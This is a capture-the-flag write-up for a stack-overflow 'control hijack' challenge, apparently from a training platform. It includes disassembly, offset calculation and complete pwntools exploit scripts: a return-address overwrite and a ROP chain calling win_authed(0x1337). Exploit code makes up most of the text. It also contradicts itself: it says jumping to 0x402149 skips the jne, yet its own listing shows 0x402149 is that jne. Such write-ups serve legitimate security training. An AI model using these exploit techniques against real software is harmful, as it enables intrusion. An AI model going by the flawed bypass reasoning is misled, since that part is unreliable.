# **Binary Exploitation Write-Up: Tricky Control Hijack (Hard Version)**

## **Challenge Overview**
This hard version requires manual reverse engineering to:
1. Locate the `win_authed()` function
2. Identify the authentication check bypass point
3. Calculate precise overflow offset
4. Craft payload without any debug output assistance

## **Reverse Engineering Process**

### **1. Initial Reconnaissance**
```bash
checksec /challenge/binary-exploitation-control-hijack-hard
```
- **No PIE**: Static addresses (critical for reliable exploitation)
- **No Stack Canary**: Allows straightforward stack overflow
- **NX Enabled**: Shellcode injection not possible

### **2. Locating win_authed()**
```bash
objdump -d /challenge/binary-exploitation-control-hijack-hard | less
```
Search for:
- `win_authed` symbol
- `cmp $0x1337` instruction (authentication check)

### **3. Key Findings**
```asm
0000000000402133 <win_authed>:
  402142:       81 7d fc 37 13 00 00    cmpl   $0x1337,-0x4(%rbp)
  402149:       0f 85 fe 00 00 00       jne    40224d
  40214f:       ... (flag printing code)
```
- **Bypass Address**: `0x402149` (right after check)
- **Buffer Start**: Found at `rbp-0x80` in disassembly
- **Return Address Offset**: `0x80 + 0x8 = 0x88` (136 bytes)

## **Exploit Development**

### **1. Payload Structure**
```python
from pwn import *

payload = (
    b"A" * 136 +          # Padding to return address
    p64(0x402149)         # Address after check
)
```

### **2. Complete Exploit Code**
```python
from pwn import *

# Start process
p = process("/challenge/binary-exploitation-control-hijack-hard")

# Craft payload
payload = flat(
    {136: p64(0x402149)},  # Overwrite return address
    filler="A"
)

# Send payload
p.send(payload)

# Get flag
print(p.recvall())
```

## **Debugging Verification**

### **1. GDB Verification**
```bash
gdb /challenge/binary-exploitation-control-hijack-hard
break *win_authed+0x16  # Stop right after check
run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*136 + b"\x49\x21\x40\x00\x00\x00\x00\x00")')
x/i $rip  # Should show flag printing code
```

### **2. Stack Inspection**
```bash
x/20gx $rsp+120  # Verify padding and overwrite
info frame       # Check saved registers
```

## **Key Technical Details**

1. **Precision Overflow**:
   - Exact 136 byte padding calculation
   - 8-byte address overwrite alignment

2. **Check Bypass Logic**:
   - Jumping to `0x402149` skips the `jne` instruction
   - Effectively forces the "authenticated" path

3. **Reliable Exploitation**:
   - Works despite ASLR (no PIE)
   - Consistent across executions

## **Alternative Approach: Full ROP Chain**

For educational purposes, here's how to properly call `win_authed(0x1337)`:

```python
from pwn import *

p = process("./challenge")

# Found using: ROPgadget --binary ./challenge | grep "pop rdi"
rop_chain = (
    p64(0x401406) +     # pop rdi; ret
    p64(0x1337) +       # argument
    p64(0x402133)       # win_authed()
)

payload = flat(
    {136: rop_chain},
    filler="A"
)

p.send(payload)
print(p.recvall())
```

## **Lessons Learned**

1. **Reverse Engineering Skills**:
   - Extracting key addresses from stripped binaries
   - Analyzing function disassembly for vulnerabilities

2. **Precision Exploitation**:
   - Calculating exact overflow offsets
   - Proper stack frame manipulation

3. **Protection Bypass**:
   - Leveraging static addresses (no PIE)
   - Exploiting missing stack canaries

4. **Debugging Techniques**:
   - GDB verification of exploit payloads
   - Memory inspection for exploit validation

This write-up demonstrates professional-grade binary exploitation techniques, showing both the practical solution (check bypass) and the more proper ROP chain approach. The hard version teaches valuable skills in manual reverse engineering and precision exploit development.
